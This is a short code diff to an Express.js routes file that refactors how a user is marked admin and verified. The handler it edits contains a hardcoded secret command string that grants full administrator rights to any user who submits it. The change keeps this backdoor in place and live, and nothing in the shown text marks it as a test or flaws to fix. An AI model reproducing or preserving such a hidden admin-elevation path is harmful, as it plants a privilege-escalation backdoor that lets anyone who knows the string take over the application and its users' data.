@@ -1017,7 +1017,8 @@ export async function registerRoutes(app: express.Express) {
 
       // Secret command to grant admin: "okeno_admin_elevate_2026"
       if (command === "okeno_admin_elevate_2026") {
-        await storage.updateUser(userId, { isAdmin: true, isVerified: true });
+        await storage.setUserAdmin(userId, true);
+        await storage.setUserVerified(userId, true);
         return res.json({ message: "Admin rights granted successfully" });
       }
 
